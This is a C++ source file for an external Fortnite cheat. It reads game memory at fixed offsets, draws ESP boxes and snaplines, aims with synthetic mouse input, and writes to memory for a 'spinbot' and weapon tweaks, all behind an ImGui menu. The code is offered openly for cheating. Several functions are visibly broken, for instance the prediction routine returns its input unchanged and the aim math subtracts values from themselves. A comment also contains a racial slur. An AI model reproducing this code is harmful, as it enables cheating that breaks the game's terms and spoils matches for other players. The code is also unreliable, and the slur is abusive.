
/*
	Fortnite External Base
	https://github.com/DX9Paster
	Permission is hereby granted, free of charge, to any person
	obtaining a copy of this software and associated documentation
	files (the "Software"), to deal in the Software without
	restriction, including without limitation the rights to use,
	copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the
	Software is furnished to do so, subject to the following
	conditions:
	The above copyright notice and this permission notice shall be
	included in all copies or substantial portions of the Software.
	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
	EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
	OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
	NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
	HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
	WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
	FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
	OTHER DEALINGS IN THE SOFTWARE.
 */

#include <iostream>
#include <string>
#include <Windows.h>
#include "FN Utils/includes.h"
#include "FN Utils/settings.h"
#include "Overlay/overlay.hpp"
#include "Window Utils/xor.h"

// LeProxy Has been Here
#define LeProxy 0xSelfPaster

bool rotating;
int value;

struct ActorLoop
{
public:
	DWORD_PTR Uworld;
	DWORD_PTR LocalPawn;
	DWORD_PTR PlayerState;
	DWORD_PTR Localplayer;
	DWORD_PTR Rootcomp;
	DWORD_PTR PlayerController;
	DWORD_PTR Persistentlevel;
	DWORD_PTR Gameinstance;
	DWORD_PTR LocalPlayers;
	uint64_t PlayerCameraManager;
	uint64_t WorldSettings;
	Vector3 localactorpos;
	uintptr_t relativelocation;
	DWORD_PTR AActors;
	DWORD ActorCount;
	uintptr_t CurrentActorMesh;
	int LocalTeam;
};
ActorLoop actors;

struct Camera
{
	float FieldOfView;
	Vector3 Rotation;
	Vector3 Location;
};

D3DXMATRIX Matrix(Vector3 rot, Vector3 origin = Vector3(0, 0, 0))
{
	float radPitch = (rot.x * float(PI) / 180.f);
	float radYaw = (rot.y * float(PI) / 180.f);
	float radRoll = (rot.z * float(PI) / 180.f);

	float SP = sinf(radPitch);
	float CP = cosf(radPitch);
	float SY = sinf(radYaw);
	float CY = cosf(radYaw);
	float SR = sinf(radRoll);
	float CR = cosf(radRoll);

	D3DMATRIX matrix;
	matrix.m[0][0] = CP * CY;
	matrix.m[0][1] = CP * SY;
	matrix.m[0][2] = SP;
	matrix.m[0][3] = 0.f;

	matrix.m[1][0] = SR * SP * CY - CR * SY;
	matrix.m[1][1] = SR * SP * SY + CR * CY;
	matrix.m[1][2] = -SR * CP;
	matrix.m[1][3] = 0.f;

	matrix.m[2][0] = -(CR * SP * CY + SR * SY);
	matrix.m[2][1] = CY * SR - CR * SP * SY;
	matrix.m[2][2] = CR * CP;
	matrix.m[2][3] = 0.f;

	matrix.m[3][0] = origin.x;
	matrix.m[3][1] = origin.y;
	matrix.m[3][2] = origin.z;
	matrix.m[3][3] = 1.f;

	return matrix;
}

struct SDKStruct
{
	struct BoneStruct
	{
		FTransform GetBoneIndex(DWORD_PTR mesh, int index)
		{
			DWORD_PTR bonearray;
			bonearray = read<DWORD_PTR>(mesh + 0x5b8);

			if (bonearray == NULL)
			{
				bonearray = read<DWORD_PTR>(mesh + 0x5b8 + 0x10);  //(mesh + 0x5e8) + 0x5a));
			}
			return read<FTransform>(bonearray + (index * 0x60));
		}

		Vector3 GetBoneWithRotation(DWORD_PTR mesh, int id)
		{
			FTransform bone = GetBoneIndex(mesh, id);
			FTransform ComponentToWorld = read<FTransform>(mesh + 0x240);

			D3DMATRIX Matrix;
			Matrix = MatrixMultiplication(bone.ToMatrixWithScale(), ComponentToWorld.ToMatrixWithScale());

			return Vector3(Matrix._41, Matrix._42, Matrix._43);
		}
	} Bone;

	struct World {
		Camera GetCamera(__int64 a1)
		{
			Camera FGC_Camera;
			__int64 v1;
			__int64 v6;
			__int64 v7;
			__int64 v8;

			v1 = read<__int64>(actors.Localplayer + 0xd0);
			__int64 v9 = read<__int64>(v1 + 0x8); // 0x10

			FGC_Camera.FieldOfView = 80.0f / (read<double>(v9 + 0x7F0) / 1.19f); // 0x680

			FGC_Camera.Rotation.x = read<double>(v9 + 0x9C0);
			FGC_Camera.Rotation.y = read<double>(a1 + 0x148);

			uint64_t FGC_Pointerloc = read<uint64_t>(actors.Uworld + 0x110);
			FGC_Camera.Location = read<Vector3>(FGC_Pointerloc);

			return FGC_Camera;
		}

		Vector3 W2S(Vector3 WorldLocation)
		{
			Camera vCamera = GetCamera(actors.Rootcomp);
			vCamera.Rotation.x = (asin(vCamera.Rotation.x)) * (180.0 / PI);
			Vector3 Camera;

			D3DMATRIX tempMatrix = Matrix(vCamera.Rotation);

			Vector3 vAxisX = Vector3(tempMatrix.m[0][0], tempMatrix.m[0][1], tempMatrix.m[0][2]);
			Vector3 vAxisY = Vector3(tempMatrix.m[1][0], tempMatrix.m[1][1], tempMatrix.m[1][2]);
			Vector3 vAxisZ = Vector3(tempMatrix.m[2][0], tempMatrix.m[2][1], tempMatrix.m[2][2]);

			Vector3 vDelta = WorldLocation - vCamera.Location;
			Vector3 vTransformed = Vector3(vDelta.Dot(vAxisY), vDelta.Dot(vAxisZ), vDelta.Dot(vAxisX));

			if (vTransformed.z < 1.f)
				vTransformed.z = 1.f;

			return Vector3((Width / 2.0f) + vTransformed.x * (((Width / 2.0f) / tanf(vCamera.FieldOfView * (float)PI / 360.f))) / vTransformed.z, (Height / 2.0f) - vTransformed.y * (((Width / 2.0f) / tanf(vCamera.FieldOfView * (float)PI / 360.f))) / vTransformed.z, 0);
		}
	} W2S;

	struct FNStruct
	{
		static std::string ReadGetNameFromFName(int key) {
			uint32_t ChunkOffset = (uint32_t)((int)(key) >> 16);
			uint16_t NameOffset = (uint16_t)key;

			uint64_t NamePoolChunk = read<uint64_t>(base_address + actors.Uworld + (8 * ChunkOffset) + 16) + (unsigned int)(4 * NameOffset);
			uint16_t nameEntry = read<uint16_t>(NamePoolChunk);

			int nameLength = nameEntry >> 6;
			char buff[1024];
			if ((uint32_t)nameLength)
			{
				for (int x = 0; x < nameLength; ++x)
				{
					buff[x] = read<char>(NamePoolChunk + 4 + x);
				}

				char* v2 = buff; // rdi 
				__int64 result; // rax 
				unsigned int v5 = nameLength; // ecx 
				__int64 v6; // r8 
				char v7; // cl 
				unsigned int v8; // eax 

				result = 22i64;
				if (v5)
				{
					v6 = v5;
					do
					{
						v7 = *v2++;
						v8 = result + 45297;
						*(v2 - 1) = v8 + ~v7;
						result = (v8 << 8) | (v8 >> 8);
						--v6;
					} while (v6);
				}

				buff[nameLength] = '\0';
				return std::string(buff);
			}
			else {
				return "";
			}
		}

		static std::string GetNameFromFName(int key)
		{
			uint32_t ChunkOffset = (uint32_t)((int)(key) >> 16);
			uint16_t NameOffset = (uint16_t)key;

			uint64_t NamePoolChunk = read<uint64_t>(base_address + actors.Uworld + (8 * ChunkOffset) + 16) + (unsigned int)(4 * NameOffset);
			if (read<uint16_t>(NamePoolChunk) < 64)
			{
				auto a1 = read<DWORD>(NamePoolChunk + 4);
				return ReadGetNameFromFName(a1);
			}
			else
			{
				return ReadGetNameFromFName(key);
			}
		}
	} fnname;
} SDK;


class Color
{
public:
	RGBA red = { 255,0,0,255 };
	RGBA Magenta = { 255,0,255,255 };
	RGBA yellow = { 255,255,0,255 };
	RGBA grayblue = { 128,128,255,255 };
	RGBA green = { 128,224,0,255 };
	RGBA darkgreen = { 0,224,128,255 };
	RGBA brown = { 192,96,0,255 };
	RGBA pink = { 255,168,255,255 };
	RGBA DarkYellow = { 216,216,0,255 };
	RGBA BuffaloPurple = { 94,23,235,255 };
	RGBA SilverWhite = { 236,236,236,255 };
	RGBA purple = { 129, 47, 212,255 };
	RGBA Navy = { 88,48,224,255 };
	RGBA skyblue = { 0,136,255,255 };
	RGBA graygreen = { 128,160,128,255 };
	RGBA blue = { 0,96,192,255 };
	RGBA coolcol = { 51, 171, 145, 255 };
	RGBA orange = { 255,128,0,255 };
	RGBA peachred = { 255,80,128,255 };
	RGBA reds = { 255,128,192,255 };
	RGBA darkgray = { 96,96,96,255 };
	RGBA Navys = { 0,0,128,255 };
	RGBA darkgreens = { 0,128,0,255 };
	RGBA darkblue = { 0,128,128,255 };
	RGBA redbrown = { 128,0,0,255 };
	RGBA purplered = { 128,0,128,255 };
	RGBA greens = { 0,255,0,255 };
	RGBA envy = { 0,255,255,255 };
	RGBA black = { 0,0,0,255 };
	RGBA gray = { 177, 181, 179,255 };
	RGBA white = { 255,255,255,255 };
	RGBA blues = { 30,144,255,255 };
	RGBA lightblue = { 135,206,250,160 };
	RGBA Scarlet = { 220, 20, 60, 160 };
	RGBA white_ = { 255,255,255,200 };
	RGBA gray_ = { 128,128,128,200 };
	RGBA black_ = { 0,0,0,200 };
	RGBA red_ = { 255,0,0,200 };
	RGBA Magenta_ = { 255,0,255,200 };
	RGBA yellow_ = { 255,255,0,200 };
	RGBA grayblue_ = { 128,128,255,200 };
	RGBA green_ = { 128,224,0,200 };
	RGBA darkgreen_ = { 0,224,128,200 };
	RGBA brown_ = { 192,96,0,200 };
	RGBA pink_ = { 255,168,255,200 };
	RGBA darkyellow_ = { 216,216,0,200 };
	RGBA silverwhite_ = { 236,236,236,200 };
	RGBA purple_ = { 144,0,255,200 };
	RGBA Blue_ = { 88,48,224,200 };
	RGBA skyblue_ = { 0,136,255,200 };
	RGBA graygreen_ = { 128,160,128,200 };
	RGBA blue_ = { 0,96,192,200 };
	RGBA orange_ = { 255,128,0,200 };
	RGBA pinks_ = { 255,80,128,200 };
	RGBA Fuhong_ = { 255,128,192,200 };
	RGBA darkgray_ = { 96,96,96,200 };
	RGBA Navy_ = { 0,0,128,200 };
	RGBA darkgreens_ = { 0,128,0,200 };
	RGBA darkblue_ = { 0,128,128,200 };
	RGBA redbrown_ = { 128,0,0,200 };
	RGBA purplered_ = { 128,0,128,200 };
	RGBA greens_ = { 0,255,0,200 };
	RGBA envy_ = { 0,255,255,200 };

	RGBA glassblack = { 0, 0, 0, 160 };
	RGBA GlassBlue = { 65,105,225,80 };
	RGBA glassyellow = { 255,255,0,160 };
	RGBA glass = { 200,200,200,60 };

	RGBA filled = { 0, 0, 0, 150 };

	RGBA Plum = { 221,160,221,160 };

	RGBA rainbow() {

		static float x = 0, y = 0;
		static float r = 0, g = 0, b = 0;

		if (y >= 0.0f && y < 255.0f) {
			r = 255.0f;
			g = 0.0f;
			b = x;
		}
		else if (y >= 255.0f && y < 510.0f) {
			r = 255.0f - x;
			g = 0.0f;
			b = 255.0f;
		}
		else if (y >= 510.0f && y < 765.0f) {
			r = 0.0f;
			g = x;
			b = 255.0f;
		}
		else if (y >= 765.0f && y < 1020.0f) {
			r = 0.0f;
			g = 255.0f;
			b = 255.0f - x;
		}
		else if (y >= 1020.0f && y < 1275.0f) {
			r = x;
			g = 255.0f;
			b = 0.0f;
		}
		else if (y >= 1275.0f && y < 1530.0f) {
			r = 255.0f;
			g = 255.0f - x;
			b = 0.0f;
		}


		return RGBA{ (DWORD)r, (DWORD)g, (DWORD)b, 255 };
	}
};
Color Col;

Vector3 AimbotCorrection(float bulletVelocity, float bulletGravity, float targetDistance, Vector3 targetPosition, Vector3 targetVelocity) {
	Vector3 recalculated = targetPosition;
	float gravity = fabs(bulletGravity);
	float time = targetDistance / fabs(bulletVelocity);
	return recalculated;
}

static bool MouseMovement(DWORD x, DWORD y, DWORD z)
{
	DWORD Defined_Target = (x + y + z); // <- Niggerish way to do it
	INPUT input;
	input.type = INPUT_MOUSE;
	input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_VIRTUALDESK;
	input.mi.mouseData = 0;
	input.mi.time = 0;
	input.mi.dx = Defined_Target;
	input.mi.dy = Defined_Target;
	SendInput(1, &input, sizeof(input));
	return true;
}

void Softaim(float x, float y, float z) {
	int AimSpeed = Settings_options.smooth;
	float Defined_Target = (static_cast<float>(x - x) + static_cast<float>(y - y) + static_cast<float>(z - z) + Settings_options.Boneoffset); // <- hitbone offset
	float ScreenCenter = (Width / static_cast<float>(2), Height / static_cast<float>(2), Depth / static_cast<float>(2));
	float Target = 0;

	if (Defined_Target != 0) {
		if (Defined_Target > ScreenCenter) {
			Target = -(ScreenCenter - Defined_Target); Target /= AimSpeed;
			if (Target + ScreenCenter > ScreenCenter * 2) Target = 0;
		}

		if (Defined_Target < ScreenCenter) {
			Target = Defined_Target - ScreenCenter; Target /= AimSpeed;
			if (Target + ScreenCenter < 0) Target = 0;
		}
	}

	MouseMovement(static_cast<DWORD>(Defined_Target), static_cast<DWORD>(Defined_Target), static_cast<DWORD>(Defined_Target));
	return;
}

void AimAt1(DWORD_PTR entity, int hitbone)
{
	Vector3 PHitbone = SDK.Bone.GetBoneWithRotation(actors.CurrentActorMesh, hitbone);
	uint64_t CurrentActorMesh = read<uint64_t>(entity + 0x310);
	Vector3 headpos = SDK.Bone.GetBoneWithRotation(CurrentActorMesh, hitbone);
	float distance = actors.localactorpos.Distance(headpos) / 250;
	Vector3 rootHeadOut = SDK.W2S.W2S(Vector3(headpos.x, headpos.y, headpos.z + 0));
	if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) {
		if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= Settings_options.AimDistance * 1)) {
			Softaim(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z);
		}
	}
}

void AimAt2(DWORD_PTR entity, int hitbone)
{
	Vector3 PHitbone = SDK.Bone.GetBoneWithRotation(actors.CurrentActorMesh, hitbone);
	uint64_t CurrentActorMesh = read<uint64_t>(entity + 0x310);
	Vector3 headpos = SDK.Bone.GetBoneWithRotation(CurrentActorMesh, hitbone);
	float distance = actors.localactorpos.Distance(headpos) / 250;
	uint64_t CurrentActorRootComponent = read<uint64_t>(CurrentActorMesh + OFFSETS::RootComponet);
	Vector3 vellocity = read<Vector3>(CurrentActorRootComponent + OFFSETS::Velocity);
	Vector3 Predicted = AimbotCorrection(30000, -504, distance, headpos, vellocity);
	Vector3 rootHeadOut = SDK.W2S.W2S(Predicted);
	if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) {
		if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= Settings_options.AimDistance * 1)) {
			Softaim(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z);
		}
	}
}

void Aim3(DWORD_PTR entity, uintptr_t gun, int hitbone)
{
	uint64_t CurrentActorMesh = read<uint64_t>(entity + 0x310);
	Vector3 PHitbone = SDK.Bone.GetBoneWithRotation(actors.CurrentActorMesh, hitbone);
	Vector3 Head = (PHitbone);
	Vector3 rootHeadOut = SDK.W2S.W2S(Vector3(Head.x, Head.y, Head.z + 0));
	int wepaon = gun;
	Overlay::cheat::DrawSnapline(wepaon, wepaon, rootHeadOut.x, rootHeadOut.y, 1.0, &Col.green);
}

bool isVisible(uint64_t mesh) {
	float tik = read<float>(mesh + 0x330);
	float tok = read<float>(mesh + 0x334);
	const float tick = 0.06f;
	return tok + tick >= tik;
}

bool FocusedgameWindow(HWND hwnd)
{
	HWND GameWin = FindWindowA(_xor_("UnrealWindow").c_str(), _xor_("Fortnite  ").c_str());
	HWND hwnd_active = GetForegroundWindow();

	if (hwnd_active == GameWin || hwnd_active == hwnd) {
		return true;
	}
	else { return false; }
}

void DrawFN()
{
	auto entityListCopy = entityList;
	float closestDistance = FLT_MAX;
	DWORD_PTR closestPawn = NULL;

	DWORD_PTR GameState = read<DWORD_PTR>(actors.Uworld + 0x158);//gamestate
	DWORD_PTR PlayerArray = read<DWORD_PTR>(GameState + OFFSETS::PlayerArray);//playerarray
	actors.Uworld = read<DWORD_PTR>(base_address + 0xB8C7C60);
	DWORD_PTR Gameinstance = read<DWORD_PTR>(actors.Uworld + 0x190);
	DWORD_PTR LocalPlayers = read<DWORD_PTR>(Gameinstance + 0x38);
	uint64_t LocalPlayerState = read<uint64_t>(OFFSETS::LocalPawn + OFFSETS::PlayerState);
	actors.LocalTeam = read<int>(LocalPlayerState + OFFSETS::TeamId);
	actors.Localplayer = read<DWORD_PTR>(LocalPlayers);
	actors.PlayerController = read<DWORD_PTR>(actors.Localplayer + 0x30);
	actors.LocalPawn = read<DWORD_PTR>(actors.PlayerController + 0x2B0);
	actors.PlayerState = read<DWORD_PTR>(actors.LocalPawn + 0x240);
	actors.Rootcomp = read<DWORD_PTR>(actors.LocalPawn + 0x138); //old 130
	actors.relativelocation = read<DWORD_PTR>(actors.Rootcomp + OFFSETS::RelativeLocation);
	actors.Persistentlevel = read<DWORD_PTR>(actors.Uworld + 0x30);
	DWORD ActorCount = read<DWORD>(actors.Persistentlevel + 0xA0);
	DWORD_PTR AActors = read<DWORD_PTR>(actors.Persistentlevel + 0x98);

	for (int i = 0; i < ActorCount; i++) {
		Settings_options.IsVis = isVisible;
		Settings_options.Focused = FocusedgameWindow;

		auto player = read<uintptr_t>(PlayerArray + i * 0x8);
		auto CurrentActor = read<uintptr_t>(player + 0x300);//PawnPrivate
		actors.CurrentActorMesh = read<uint64_t>(CurrentActor + OFFSETS::Mesh);
		int TeamIndex = read<int>(actors.PlayerState + OFFSETS::TeamId);

		Vector3 Hitbone = SDK.Bone.GetBoneWithRotation(actors.CurrentActorMesh, Settings_options.hitbone);
		Vector3 Headpos = SDK.Bone.GetBoneWithRotation(actors.CurrentActorMesh, 68);
		Vector3 Neck = SDK.Bone.GetBoneWithRotation(actors.CurrentActorMesh, 67);
		Vector3 root = SDK.Bone.GetBoneWithRotation(actors.CurrentActorMesh, 0);
		Vector3 vHeadBoneOut = SDK.W2S.W2S(Vector3(Headpos.x, Headpos.y, Headpos.z));

		float distance = actors.localactorpos.Distance(Headpos) / 100.f;

		Vector3 Headbox = SDK.W2S.W2S(Vector3(Headpos.x, Headpos.y, Headpos.z + 15));

		float BoxHeight = (float)(Headbox.y - root.y);
		float BoxWidth = BoxHeight * 0.550;

		float LeftX = (float)Headbox.x - (BoxWidth / 1);
		float LeftY = (float)root.y;

		float CornerHeight = abs(Headbox.y - root.y);
		float CornerWidth = CornerHeight * 0.550;

		RGBA ESPColorSkill = { 0, 0, 0, 255 };
		if (Settings_options.VisableCheck) {
			if (Settings_options.IsVis) {
				ESPColorSkill = { 0, 255, 0, 255 };
			}
			else if (!Settings_options.IsVis) {
				ESPColorSkill = { 255, 0, 0, 255 };
			}
		}

		if (Settings_options.Focused == true) continue;
		if (TeamIndex != actors.LocalTeam) continue;
		if (CurrentActor == actors.LocalPawn) continue;

		if (!IsVec3Valid(Hitbone))continue;
		if (!IsVec3Valid(Headpos))continue;
		if (!IsVec3Valid(Neck))continue;
		if (!IsVec3Valid(root))continue;

		if (Settings_options.Esp || distance <= Settings_options.esp_distance || IsInScreen(Neck))
		{
			if (Settings_options.corner) {
				Overlay::cheat::DrawCornerBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, 2.9, &Col.black);
			}

			if (Settings_options.box) {
				Overlay::cheat::DrawRect(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, 0.5, &Col.black);
			}

			if (Settings_options.snaplines)	{
				Overlay::cheat::DrawSnapline(Width / 2, Height, root.x, root.y, 0.7, &Col.black);
			}
		}

		if (Settings_options.aimbot && IsInScreen(Neck)) {
			auto dx = vHeadBoneOut.x - (Width / 2);
			auto dy = vHeadBoneOut.y - (Height / 2);
			auto dz = vHeadBoneOut.z - (Depth / 2);
			auto dist = sqrtf(dx * dx + dy * dy + dz * dz) / 100.0f;
			auto isDBNO = (read<char>(actors.CurrentActorMesh + OFFSETS::IsDBNO) >> 4) & 1;
			if (dist < Settings_options.AimDistance && dist < closestDistance && TeamIndex != actors.LocalTeam) {
				if (Settings_options.SkippedDowned) {
					if (!isDBNO) {
						closestDistance = dist;
						closestPawn = CurrentActor;
					}
				}
				else {
					closestDistance = dist;
					closestPawn = CurrentActor;
				}
			}
		}
	}


	for (int i = 0; i < actors.LocalPawn; i++)
	{
		if (Settings_options.hvh)
		{
			if (!rotating)
			{
				uint64_t PlayerMesh = read<uint64_t>(actors.LocalPawn + OFFSETS::Mesh);
				value = value + 100;
				write<Vector3>(PlayerMesh + 0x140, Vector3(1, value, 1));
				rotating = 1;
			}
			else if (rotating)
			{
				uint64_t PlayerMesh = read<uint64_t>(actors.LocalPawn + 0x2F0);
				write<Vector3>(PlayerMesh + 0x140, Vector3(0, -90, 0));
				rotating = 0;
			}
		}
	}

	if (closestPawn != 0)
	{
		if (Settings_options.aimbot && closestPawn && GetAsyncKeyState(VK_RBUTTON) < 0) {
			AimAt1(closestPawn, Settings_options.hitbone);

			if (Settings_options.Prediction)
			{
				AimAt2(closestPawn, Settings_options.hitbone);
			}

			if (Settings_options.MuzzleLines)
			{
				uintptr_t CurrentWeapon = read<uintptr_t>(actors.LocalPawn + OFFSETS::currentweapon);
				Aim3(closestPawn, CurrentWeapon, Settings_options.hitbone);
			}

			if (Settings_options.Guntracer && GetAsyncKeyState(VK_RBUTTON) < 0)
			{
				uintptr_t CurrentWeapon = read<uintptr_t>(actors.LocalPawn + OFFSETS::currentweapon);
				write<float>(CurrentWeapon + 0x64, 99);
			}
			else if (Settings_options.Guntracer && !GetAsyncKeyState(VK_RBUTTON)) {
				uintptr_t CurrentWeapon = read<uintptr_t>(actors.LocalPawn + OFFSETS::currentweapon);
				write<float>(CurrentWeapon + 0x64, 1);
			}
		}
	}
}

void Render()
{
	if (Settings_options.Trademark) { ImGui::GetOverlayDrawList()->AddText(ImVec2(13, 110 + 18 * 5), IM_COL32(255, 255, 255, 255), ("FN Softaim")); }
	if (Settings_options.FOVCircle) { Overlay::cheat::DrawCircle(Width / 2, Height / 2, Settings_options.AimFOV, &Col.filled, 2000, 0.5); }

	DrawFN();

	ImVec4* colors = ImGui::GetStyle().Colors;
	colors[ImGuiCol_Text] = ImVec4(0.80f, 0.80f, 0.83f, 1.00f);
	colors[ImGuiCol_TextDisabled] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
	colors[ImGuiCol_WindowBg] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
	colors[ImGuiCol_ChildWindowBg] = ImVec4(0.07f, 0.07f, 0.09f, 1.00f);
	colors[ImGuiCol_PopupBg] = ImVec4(0.07f, 0.07f, 0.09f, 1.00f);
	colors[ImGuiCol_Border] = ImVec4(0.80f, 0.80f, 0.83f, 0.88f);
	colors[ImGuiCol_BorderShadow] = ImVec4(0.92f, 0.91f, 0.88f, 0.00f);
	colors[ImGuiCol_FrameBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
	colors[ImGuiCol_FrameBgHovered] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
	colors[ImGuiCol_FrameBgActive] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
	colors[ImGuiCol_MenuBarBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
	colors[ImGuiCol_ScrollbarBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
	colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.80f, 0.80f, 0.83f, 0.31f);
	colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
	colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
	colors[ImGuiCol_SliderGrab] = ImVec4(0.80f, 0.80f, 0.83f, 0.31f);
	colors[ImGuiCol_SliderGrabActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
	colors[ImGuiCol_Button] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
	colors[ImGuiCol_ButtonHovered] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
	colors[ImGuiCol_ButtonActive] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
	colors[ImGuiCol_Header] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
	colors[ImGuiCol_HeaderHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
	colors[ImGuiCol_HeaderActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
	colors[ImGuiCol_Column] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
	colors[ImGuiCol_ColumnHovered] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
	colors[ImGuiCol_ColumnActive] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
	colors[ImGuiCol_ResizeGrip] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
	colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
	colors[ImGuiCol_ResizeGripActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
	colors[ImGuiCol_CheckMark] = ImVec4(0.150f, 0.361f, 0.696f, 1.000f);
	colors[ImGuiCol_PlotLines] = ImVec4(0.40f, 0.39f, 0.38f, 0.63f);
	colors[ImGuiCol_PlotLinesHovered] = ImVec4(0.25f, 1.00f, 0.00f, 1.00f);
	colors[ImGuiCol_PlotHistogram] = ImVec4(0.40f, 0.39f, 0.38f, 0.63f);
	colors[ImGuiCol_PlotHistogramHovered] = ImVec4(0.25f, 1.00f, 0.00f, 1.00f);
	colors[ImGuiCol_TextSelectedBg] = ImVec4(0.25f, 1.00f, 0.00f, 0.43f);
	colors[ImGuiCol_ModalWindowDarkening] = ImVec4(1.00f, 0.98f, 0.95f, 0.73f);

	ImGui::GetStyle().WindowPadding = ImVec2(15, 15);
	ImGui::GetStyle().WindowRounding = 5.0f;
	ImGui::GetStyle().FramePadding = ImVec2(5, 5);
	ImGui::GetStyle().FrameRounding = 4.0f;
	ImGui::GetStyle().ItemSpacing = ImVec2(12, 8);
	ImGui::GetStyle().ItemInnerSpacing = ImVec2(8, 6);
	ImGui::GetStyle().IndentSpacing = 25.0f;
	ImGui::GetStyle().ScrollbarSize = 15.0f;
	ImGui::GetStyle().ScrollbarRounding = 9.0f;
	ImGui::GetStyle().GrabMinSize = 5.0f;
	ImGui::GetStyle().GrabRounding = 3.0f;

	bool Head = true;
	bool Neck = false;
	bool Chest = false;
	bool Root = false;

	if (Settings_options.DrawMenu)
	{
		if (ImGui::Begin(("FN SOFTAIM"), 0, ImGuiWindowFlags_::ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_::ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoScrollbar))
			ImGui::SetNextWindowSize(ImVec2({ 300, 675 }), ImGuiSetCond_FirstUseEver); {
			ImGui::SetWindowSize({ 520, 400 });
			static int MenuTab;

			if (ImGui::Button("Aimbot", ImVec2(120 - 5, 30))) { MenuTab = 1; }
			ImGui::SameLine();
			if (ImGui::Button("Visuals", ImVec2(120 - 5, 30))) { MenuTab = 2; }
			ImGui::SameLine();
			if (ImGui::Button("Extra", ImVec2(120 - 5, 30))) { MenuTab = 3; }

			ImGui::Spacing();
			ImGui::PushFont(SkeetFont);
			{
				switch (MenuTab) {
				case 0:
					ImGui::BeginChild((E("##Aimbot")), ImVec2(510, 390), true); {
					    ImGui::Text("Skeeting");
						ImGui::Spacing();
						ImGui::Checkbox("Softaim", &Settings_options.aimbot);
						if (Settings_options.aimbot) {
							ImGui::Checkbox("Aim Prediction", &Settings_options.Prediction);
							ImGui::Checkbox("Gun Tracers", &Settings_options.Guntracer);
							ImGui::Checkbox("Muzzel Lines", &Settings_options.MuzzleLines);
							ImGui::Checkbox("Skip knocked", &Settings_options.SkippedDowned);
						}
						ImGui::Checkbox("AimFOV", &Settings_options.FOVCircle);
						ImGui::Spacing();
						ImGui::Checkbox("Hitbone : Head", &Head);
						ImGui::Checkbox("Hitbone : Neck", &Neck); 
						ImGui::Checkbox("Hitbone : Chest", &Chest);
						ImGui::Checkbox("Hitbone : Root", &Root);
						if (Head) {
							Neck = false;
							Chest = false;
							Root = false;
							Settings_options.hitbone = 68;
						}
						if (Neck) {
							Head = false;
							Chest = false;
							Root = false;
							Settings_options.hitbone = 67;
						}
						if (Chest) {
							Head = false;
							Neck = false;
							Root = false;
							Settings_options.hitbone = 7;
						}
						if (Root) {
							Head = false;
							Chest = false;
							Chest = false;
							Settings_options.hitbone = 0;
						}
					}
					break;
				case 2:
					ImGui::BeginChild((E("##Visuals")), ImVec2(510, 390), true); {
						ImGui::Text("Skeeting");
						ImGui::Spacing();
						ImGui::Checkbox("Snaplines", &Settings_options.snaplines);
						ImGui::Checkbox("Corner box", &Settings_options.corner);
						ImGui::Checkbox("Outlined box", &Settings_options.box);
						ImGui::Text("   ");
						ImGui::Checkbox("Vischeck", &Settings_options.VisableCheck);
						if (Settings_options.corner) {
							Settings_options.box = false;
						}
						if (Settings_options.box) {
							Settings_options.corner = false;
						}
					}
					break;
				case 3:
					ImGui::BeginChild((E("##Extra")), ImVec2(510, 390), true); {
						ImGui::Text("Skeeting");
						ImGui::Checkbox("TardeMark", &Settings_options.Trademark);
						ImGui::Checkbox("Spinbot Humanized", &Settings_options.hvh);
					}
					break;
				}
			}
		}

		ImGui::GetIO().MouseDrawCursor = 1;
	}
	else {
		ImGui::GetIO().MouseDrawCursor = 0;
	}

	ImGui::End();
	ImGui::EndFrame();

	p_Device->SetRenderState(D3DRS_ZENABLE, false);
	p_Device->SetRenderState(D3DRS_ALPHABLENDENABLE, false);
	p_Device->SetRenderState(D3DRS_SCISSORTESTENABLE, false);
